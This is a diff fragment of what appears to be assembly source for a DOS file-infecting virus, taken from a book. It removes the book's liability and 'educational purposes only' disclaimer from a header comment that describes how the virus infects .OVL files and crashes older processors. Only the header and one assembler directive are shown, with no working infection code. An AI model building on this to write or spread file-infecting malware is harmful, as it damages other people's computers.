@@ -25,13 +25,6 @@ COMMENT ~=================================================================
 =            and .OVL files will be infected if they are opened for any  =
 =            reason.  Execution on an 8086 or 286 computer will result   =
 =            in a crash.                                                 =
-=                                                                        =
-==========================================================================
-=  BEFORE COMPILING THIS CODE, IT MUST BE NOTED THAT THE AUTHOR AND      =
-=  PUBLISHER OF THIS BOOK CANNOT BE HELD LIABLE FOR ANY DAMAGES THAT MAY =  
-=  BE INCURRED BY THE USE OF OR THE EXPERIMENTATION WITH COMPUTER        =  
-=  VIRUSES. THIS BOOK IS FOR EDUCATIONAL PURPOSES ONLY. EDUCATION IS NOT =  
-=  HERE TO BE ABUSED.                                                    =
 =========================================================================~
 
         .model   tiny
